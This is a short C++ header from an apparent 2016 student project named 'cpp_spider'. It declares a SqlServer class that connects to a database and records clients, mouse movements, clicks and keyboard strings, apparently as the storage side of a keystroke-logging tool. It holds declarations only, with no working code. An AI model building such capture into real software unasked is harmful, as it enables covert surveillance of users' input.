//
// SqlServer.hh for sqlServer in /home/debrab_t/rendu/TEK3/cpp_spider/bdd_connect
//
// Made by debrab_t
// Login   <debrab_t@epitech.net>
//
// Started on  Mon Nov  7 10:23:23 2016 debrab_t
// Last update Tue Nov  8 14:31:14 2016 debrab_t
//

#include "SqlManager.hh"

class SqlServer
{
public:
  SqlServer();
  ~SqlServer();
  bool	dbConnect(std::string const &);
  void	createServTab();
  void	addClient();
  void	addMouseMouvement();
  void	addMouseClick();
  void	addKeyboardString();

private:
  SqlManager	sqlMan;
  int		clientId;
};
